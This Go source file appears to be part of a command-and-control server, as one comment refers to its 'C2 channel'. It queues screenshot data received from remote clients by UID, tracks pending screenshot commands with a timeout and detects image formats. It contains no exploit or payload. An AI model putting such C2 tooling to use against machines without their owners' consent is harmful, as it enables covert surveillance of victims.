package command

import (
	"strings"
	"sync"
	"time"
	"BackendTemplate/pkg/utils/logx"
)

type ScreenshotQueue struct {
	mutex  sync.Mutex
	Queues map[string]chan string
	// 新增: 命令上下文跟踪
	ExpectedScreenshots map[string]time.Time // 记录哪些UID正在等待截图响应
}

var VarScreenshotQueue = &ScreenshotQueue{
	Queues:              make(map[string]chan string),
	ExpectedScreenshots: make(map[string]time.Time),
}

func (q *ScreenshotQueue) Add(uid string, screenshot string) {
	q.mutex.Lock()
	defer q.mutex.Unlock()

	// 对于截图队列，始终尝试发送数据，即使队列不存在也要创建
	if queue, exists := q.Queues[uid]; exists {
		// 非阻塞发送 + 满时丢旧帧：防止消费者断开时阻塞传输读循环（整个C2通道瘫痪）
		select {
		case queue <- screenshot:
			// 数据发送成功
			logx.Infof("✅ 截图数据已发送到队列 - UID: %s, 数据长度: %d\n", uid, len(screenshot))
		default:
			// 队列已满：清空旧数据再尝试发送（仍非阻塞）
			select {
			case <-queue: // 清空旧数据
				logx.Warnf("⚠️ 清空截图队列中的旧数据 - UID: %s\n", uid)
			default:
			}
			select {
			case queue <- screenshot:
				logx.Infof("✅ 截图数据已发送到队列（清空后） - UID: %s, 数据长度: %d\n", uid, len(screenshot))
			default:
				// 消费者已断开：丢弃新数据，绝不阻塞
				logx.Warnf("⚠️ 截图队列无消费者，丢弃数据 - UID: %s, 数据长度: %d\n", uid, len(screenshot))
			}
		}
	} else {
		// 队列不存在，记录警告但不丢弃数据
		logx.Warnf("⚠️ 截图队列不存在 - UID: %s，数据长度: %d\n", uid, len(screenshot))
	}
}

func (q *ScreenshotQueue) GetOrCreateQueue(uid string) chan string {
	q.mutex.Lock()
	defer q.mutex.Unlock()

	// 总是创建一个新的、干净的队列，以防止旧数据干扰
	newQueue := make(chan string, 1)
	q.Queues[uid] = newQueue
	return newQueue
}

func (q *ScreenshotQueue) RemoveQueue(uid string) {
	q.mutex.Lock()
	defer q.mutex.Unlock()

	if queue, exists := q.Queues[uid]; exists {
		close(queue)
		delete(q.Queues, uid)
	}

	// 清理命令上下文
	delete(q.ExpectedScreenshots, uid)
}

// 新增: 设置截图命令期望
func (q *ScreenshotQueue) SetScreenshotExpected(uid string, expected bool) {
	q.mutex.Lock()
	defer q.mutex.Unlock()

	if expected {
		q.ExpectedScreenshots[uid] = time.Now()
		logx.Infof("📅 设置截图命令期望 - UID: %s\n", uid)
	} else {
		delete(q.ExpectedScreenshots, uid)
		logx.Infof("✅ 清除截图命令期望 - UID: %s\n", uid)
	}
}

// 新增: 检查是否期望截图响应
func (q *ScreenshotQueue) IsScreenshotExpected(uid string) bool {
	q.mutex.Lock()
	defer q.mutex.Unlock()

	expectedTime, exists := q.ExpectedScreenshots[uid]
	if !exists {
		return false
	}

	// 检查是否超时（超过60秒的命令上下文将被清理）
	if time.Since(expectedTime) > 60*time.Second {
		delete(q.ExpectedScreenshots, uid)
		logx.Warnf("⚠️ 截图命令上下文超时，已清理 - UID: %s\n", uid)
		return false
	}

	return true
}

// 新增: 检查数据是否为图像格式
func IsImageData(data []byte) bool {
	if len(data) < 8 {
		return false
	}

	// 检查常见图像格式的文件头
	// PNG: 89 50 4E 47 0D 0A 1A 0A
	if len(data) >= 8 && data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47 {
		return true
	}

	// JPEG: FF D8 FF
	if len(data) >= 3 && data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF {
		return true
	}

	// BMP: 42 4D
	if len(data) >= 2 && data[0] == 0x42 && data[1] == 0x4D {
		return true
	}

	// GIF: 47 49 46 38
	if len(data) >= 4 && data[0] == 0x47 && data[1] == 0x49 && data[2] == 0x46 && data[3] == 0x38 {
		return true
	}

	// 【关键修复】检查是否为Base64编码的Data URI
	// 扩大检查范围以确保能检测到完整的Data URI头部
	checkLength := min(100, len(data)) // 增加到100字符
	dataStr := string(data[:checkLength])
	
	// 检查各种可能的Data URI格式
	if len(dataStr) >= 10 && strings.HasPrefix(dataStr, "data:image") {
		return true
	}
	if len(dataStr) >= 22 && strings.HasPrefix(dataStr, "data:image/png;base64,") {
		return true
	}
	if len(dataStr) >= 23 && strings.HasPrefix(dataStr, "data:image/jpeg;base64,") {
		return true
	}
	if len(dataStr) >= 22 && strings.HasPrefix(dataStr, "data:image/jpg;base64,") {
		return true
	}
	if len(dataStr) >= 22 && strings.HasPrefix(dataStr, "data:image/gif;base64,") {
		return true
	}
	if len(dataStr) >= 22 && strings.HasPrefix(dataStr, "data:image/bmp;base64,") {
		return true
	}

	return false
}

// 辅助函数
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
// RemoveEntries 删除指定客户端的所有截图通道与期望记录（断线/删除客户端时调用）
func (q *ScreenshotQueue) RemoveEntries(uid string) {
	q.mutex.Lock()
	defer q.mutex.Unlock()
	delete(q.Queues, uid)
	delete(q.ExpectedScreenshots, uid)
}
